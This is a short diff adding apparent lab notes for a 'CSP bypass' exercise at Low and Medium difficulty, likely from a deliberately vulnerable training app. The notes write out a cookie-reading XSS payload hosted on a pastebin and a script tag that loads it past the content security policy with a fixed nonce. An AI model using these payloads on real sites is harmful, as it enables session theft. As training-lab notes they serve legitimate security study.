@@ -1,0 +1,14 @@
+Low
+
+hastebin.com
+alert(document.cookie);
+
+click save
+click Just Text
+copy link
+
+paste link in CSP bypass, session link will come as output
+https://www.toptal.com/developers/hastebin/raw/uhikonakit
+
+Medium
+<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=" src="https://www.toptal.com/developers/hastebin/raw/uhikonakit"></script>
